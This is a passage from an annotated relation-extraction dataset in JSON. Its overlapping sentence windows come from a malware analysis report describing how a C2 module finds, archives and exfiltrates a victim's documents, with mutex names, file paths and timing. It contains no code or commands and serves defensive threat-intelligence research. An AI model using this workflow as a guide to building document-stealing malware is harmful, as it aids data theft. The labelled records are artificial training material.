"C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "event", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "C2 contact module", "pos": [8, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [22, 22], "name": "components", "pos": [22, 23], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [24, 24], "name": "C2 contact module", "pos": [0, 3], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [32, 32], "name": "service", "pos": [8, 9], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "explorer.exe", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [53, 53], "name": "service", "pos": [6, 7], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "C2 contact module", "pos": [13, 16], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [67, 67], "name": "module", "pos": [1, 2], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [73, 73], "name": "document search module", "pos": [7, 10], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [79, 79], "name": "C2", "pos": [13, 14], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [83, 83], "name": "collected documents", "pos": [17, 19], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [86, 86], "name": "It", "pos": [0, 1], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [95, 95], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "it", "pos": [2, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [106, 106], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [113, 113], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [126, 126], "name": "infinite loop", "pos": [28, 30], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [134, 134], "name": "loop", "pos": [5, 6], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [139, 139], "name": "C2", "pos": [10, 11], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [148, 148], "name": "it", "pos": [5, 6], "index": "20_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [152, 152], "name": "identification", "pos": [9, 10], "index": "21_0"}]], "labels": [{"r": "FR", "evidence": [0], "t": 0, "h": 1}, {"r": "UK", "evidence": [0], "h": 1, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 7}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 8}, {"r": "CO", "evidence": [0, 1, 2, 3, 4], "h": 1, "t": 12}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 9}, {"r": "ST", "evidence": [3], "h": 8, "t": 10}, {"r": "RF", "evidence": [3], "h": 8, "t": 10}, {"r": "WR", "evidence": [3], "h": 8, "t": 11}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "FR", "evidence": [5], "h": 14, "t": 15}, {"r": "FR", "evidence": [5], "h": 14, "t": 16}, {"r": "FR", "evidence": [5], "h": 14, "t": 17}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 18}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 20}, {"r": "ST", "evidence": [6], "h": 18, "t": 19}, {"r": "RF", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [7], "h": 20, "t": 21}]}, {"title": "641-24", "sents": [["C2", "contact", "module", ":", "winprint32.exe", "Regularly", ",", "the", "service", "checks", "if", "a", "user", "is", "logged", ",", "by", "checking", "if", "Explorer", "is", "running", "."], ["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "C2 contact module", "pos": [0, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "service", "pos": [8, 9], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [24, 24], "name": "explorer.exe", "pos": [1, 2], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [29, 29], "name": "service", "pos": [6, 7], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "C2 contact module", "pos": [13, 16], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [43, 43], "name": "module", "pos": [1, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [49, 49], "name": "document search module", "pos": [7, 10], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [55, 55], "name": "C2", "pos": [13, 14], "index": "7_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [59, 59], "name": "collected documents", "pos": [17, 19], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [71, 71], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [76, 76], "name": "it", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [89, 89], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [102, 102], "name": "infinite loop", "pos": [28, 30], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [110, 110], "name": "loop", "pos": [5, 6], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [115, 115], "name": "C2", "pos": [10, 11], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [124, 124], "name": "it", "pos": [5, 6], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [128, 128], "name": "identification", "pos": [9, 10], "index": "18_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "it", "pos": [9, 10], "index": "19_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [155, 155], "name": "sft", "pos": [14, 15], "index": "20_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [177, 177], "name": "C2", "pos": [36, 37], "index": "21_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "EX", "evidence": [1], "t": 2, "h": 3}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "ST", "evidence": [2], "h": 5, "t": 7}, {"r": "RF", "evidence": [2], "h": 5, "t": 7}, {"r": "WR", "evidence": [2], "h": 5, "t": 8}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [4], "h": 11, "t": 12}, {"r": "FR", "evidence": [4], "h": 11, "t": 13}, {"r": "FR", "evidence": [4], "h": 11, "t": 14}, {"r": "CO", "evidence": [4, 5], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5, 6], "h": 14, "t": 17}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 14, "t": 19}, {"r": "ST", "evidence": [5], "h": 15, "t": 16}, {"r": "RF", "evidence": [5], "h": 15, "t": 16}, {"r": "WR", "evidence": [6], "h": 17, "t": 18}, {"r": "RD", "evidence": [7], "h": 19, "t": 20}, {"r": "ST", "evidence": [7], "h": 19, "t": 21}, {"r": "RF", "evidence": [7], "h": 19, "t": 21}]}, {"title": "641-25", "sents": [["Once", "explorer.exe", "is", "running", ",", "the", "service", "configures", "the", "environment", "and", "executes", "the", "C2", "contact", "module", ":", "winprint32.exe", "."], ["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "explorer.exe", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "service", "pos": [6, 7], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "C2 contact module", "pos": [13, 16], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "module", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [26, 26], "name": "document search module", "pos": [7, 10], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [32, 32], "name": "C2", "pos": [13, 14], "index": "5_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [36, 36], "name": "collected documents", "pos": [17, 19], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [39, 39], "name": "It", "pos": [0, 1], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [48, 48], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [53, 53], "name": "it", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [59, 59], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "10_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [66, 66], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [79, 79], "name": "infinite loop", "pos": [28, 30], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [87, 87], "name": "loop", "pos": [5, 6], "index": "13_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [92, 92], "name": "C2", "pos": [10, 11], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [101, 101], "name": "it", "pos": [5, 6], "index": "15_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [105, 105], "name": "identification", "pos": [9, 10], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [127, 127], "name": "it", "pos": [9, 10], "index": "17_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [132, 132], "name": "sft", "pos": [14, 15], "index": "18_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [154, 154], "name": "C2", "pos": [36, 37], "index": "19_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [158, 158], "name": "it", "pos": [2, 3], "index": "20_0"}]], "labels": [{"r": "EX", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [1], "h": 3, "t": 4}, {"r": "ST", "evidence": [1], "h": 3, "t": 5}, {"r": "RF", "evidence": [1], "h": 3, "t": 5}, {"r": "WR", "evidence": [1], "h": 3, "t": 6}, {"r": "WR", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "FR", "evidence": [3], "h": 9, "t": 11}, {"r": "FR", "evidence": [3], "h": 9, "t": 12}, {"r": "CO", "evidence": [3, 4], "h": 12, "t": 13}, {"r": "CO", "evidence": [3, 4, 5], "h": 12, "t": 15}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 12, "t": 17}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 12, "t": 20}, {"r": "ST", "evidence": [4], "h": 13, "t": 14}, {"r": "RF", "evidence": [4], "h": 13, "t": 14}, {"r": "WR", "evidence": [5], "h": 15, "t": 16}, {"r": "RD", "evidence": [6], "h": 17, "t": 18}, {"r": "ST", "evidence": [6], "h": 17, "t": 19}, {"r": "RF", "evidence": [6], "h": 17, "t": 19}]}, {"title": "641-26", "sents": [["This", "module", "is", "responsible", "for", "launching", "the", "document", "search", "module", ",", "contact", "the", "C2", "and", "exfiltrate", "the", "collected", "documents", "."], ["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [1, 1], "name": "module", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "document search module", "pos": [7, 10], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [13, 13], "name": "C2", "pos": [13, 14], "index": "2_0"}], [{"type": "TF", "sent_id": 0, "global_pos": [17, 17], "name": "collected documents", "pos": [17, 19], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "It", "pos": [0, 1], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [29, 29], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [34, 34], "name": "it", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [40, 40], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [47, 47], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [60, 60], "name": "infinite loop", "pos": [28, 30], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [68, 68], "name": "loop", "pos": [5, 6], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [73, 73], "name": "C2", "pos": [10, 11], "index": "11_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [82, 82], "name": "it", "pos": [5, 6], "index": "12_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [86, 86], "name": "identification", "pos": [9, 10], "index": "13_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "it", "pos": [9, 10], "index": "14_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [113, 113], "name": "sft", "pos": [14, 15], "index": "15_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [135, 135], "name": "C2", "pos": [36, 37], "index": "16_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [139, 139], "name": "it", "pos": [2, 3], "index": "17_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "Document search module", "pos": [0, 3], "index": "18_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "ST", "evidence": [0], "h": 0, "t": 2}, {"r": "RF", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [2], "h": 6, "t": 9}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 10}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 12}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 9, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 9, "t": 17}, {"r": "ST", "evidence": [3], "h": 10, "t": 11}, {"r": "RF", "evidence": [3], "h": 10, "t": 11}, {"r": "WR", "evidence": [4], "h": 12, "t": 13}, {"r": "RD", "evidence": [5], "h": 14, "t": 15}, {"r": "ST", "evidence": [5], "h": 14, "t": 16}, {"r": "RF", "evidence": [5], "h": 14, "t": 16}]}, {"title": "641-27", "sents": [["It", "will", "create", "a", "mutex", "with", "the", "name", "``", "YeucqCcpgapiZISEdRSNiL", "''", "."], ["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "It", "pos": [0, 1], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [9, 9], "name": "YeucqCcpgapiZISEdRSNiL", "pos": [9, 10], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [14, 14], "name": "it", "pos": [2, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [20, 20], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [27, 27], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "infinite loop", "pos": [28, 30], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [48, 48], "name": "loop", "pos": [5, 6], "index": "6_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [53, 53], "name": "C2", "pos": [10, 11], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [62, 62], "name": "it", "pos": [5, 6], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [66, 66], "name": "identification", "pos": [9, 10], "index": "9_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [88, 88], "name": "it", "pos": [9, 10], "index": "10_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [93, 93], "name": "sft", "pos": [14, 15], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [115, 115], "name": "C2", "pos": [36, 37], "index": "12_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [119, 119], "name": "it", "pos": [2, 3], "index": "13_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [129, 129], "name": "Document search module", "pos": [0, 3], "index": "14_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [149, 149], "name": "tool", "pos": [4, 5], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [154, 154], "name": "hard drive", "pos": [9, 11], "index": "16_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [165, 165], "name": "archive", "pos": [20, 21], "index": "17_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 2, "t": 4}, {"r": "FR", "evidence": [1], "h": 2, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2, 3], "h": 5, "t": 8}, {"r": "CO", "evidence": [1, 2, 3, 4], "h": 5, "t": 10}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 5, "t": 13}, {"r": "ST", "evidence": [2], "h": 6, "t": 7}, {"r": "RF", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [3], "h": 8, "t": 9}, {"r": "RD", "evidence": [4], "h": 10, "t": 11}, {"r": "ST", "evidence": [4], "h": 10, "t": 12}, {"r": "RF", "evidence": [4], "h": 10, "t": 12}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}, {"r": "UK", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 17}]}, {"title": "641-28", "sents": [["Afterward", ",", "it", "will", "launch", "two", "processes", ":", "C", ":", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "C:", "\\DOCUME~1\\", "<", "USER", ">", "~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "creation", "Then", ",", "it", "will", "start", "an", "infinite", "loop", "."], ["The", "first", "step", "inside", "the", "loop", "is", "to", "contact", "the", "C2", "over", "HTTPS", "."], ["On", "the", "first", "contact", ",", "it", "will", "send", "an", "identification", "of", "the", "victim", "based", "on", "the", "hard", "disk", "volume", "serial", "number", "."], ["Contact", "C2", "loop", "After", "a", "6,050-", "milliseconds", "delay", ",", "it", "will", "search", "for", "``", "sft", "''", "files", "(", "the", "encoded", "archive", "containing", "the", "documents", "to", "be", "exfiltrated", ")", ",", "which", "will", "then", "be", "exfiltrated", "to", "the", "C2", "."], ["Afterward", ",", "it", "will", "sleep", "for", "another", "6,050", "milliseconds", "before", "restarting", "."], ["Document", "search", "module", ":", "Mssqldbserv.xml", "This", "module", "has", "been", "described", "before", "in", "the", "article", "here", "."], ["The", "purpose", "of", "this", "tool", "is", "to", "parse", "the", "hard", "drive", "for", "files", "with", "a", "specific", "extension", "and", "create", "an", "archive", "with", "these", "files", "."], ["Finally", ",", "the", "archive", "is", "encoded", "before", "being", "sent", "to", "the", "C2.mssqldbserv.xml", "main", "function", "However", ",", "there", "are", "some", "interesting", "details", "we", "decided", "to", "share", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [2, 2], "name": "it", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "C : \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\mssqldbserv.xml", "pos": [8, 15], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "C: \\DOCUME~1\\ < USER > ~1\\LOCALS~1\\Temp\\4CA-B25C11-A27BC\\wintasks.xml", "pos": [15, 21], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [28, 28], "name": "infinite loop", "pos": [28, 30], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [36, 36], "name": "loop", "pos": [5, 6], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [41, 41], "name": "C2", "pos": [10, 11], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [50, 50], "name": "it", "pos": [5, 6], "index": "6_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [54, 54], "name": "identification", "pos": [9, 10], "index": "7_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [76, 76], "name": "it", "pos": [9, 10], "index": "8_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [81, 81], "name": "sft", "pos": [14, 15], "index": "9_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [103, 103], "name": "C2", "pos": [36, 37], "index": "10_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "it", "pos": [2, 3], "index": "11_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [117, 117], "name": "Document search module", "pos": [0, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [137, 137], "name": "tool", "pos": [4, 5], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [142, 142], "name": "hard drive", "pos": [9, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "archive", "pos": [20, 21], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [161, 161], "name": "archive", "pos": [3, 4], "index": "16_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 